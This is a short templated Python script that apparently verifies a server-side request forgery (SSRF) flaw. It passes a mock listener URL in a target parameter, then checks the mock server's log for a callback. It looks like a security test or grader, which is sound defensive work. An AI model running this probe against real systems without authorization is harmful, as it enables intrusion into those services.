import json
import urllib.parse
import urllib.request

target_url = "{{TARGET_URL}}"
param_name = "{{PARAM_NAME}}"
mock_server_url = "{{MOCK_SERVER_URL}}"  

params = {param_name: mock_server_url}
url = target_url + "?" + urllib.parse.urlencode(params)

try:
    
    with urllib.request.urlopen(url) as response:
        pass

    
    with urllib.request.urlopen(
        mock_server_url.replace("/ssrf-listener", "/requests")
    ) as response:
        requests = json.loads(response.read().decode())
        for r in requests:
            if "/ssrf-listener" in r.get("path", ""):
                print("VERIFIED: SSRF callback received by mock server")
                exit(0)
except Exception as e:
    print(f"ERROR: {e}")

print("NOT VERIFIED")
exit(1)
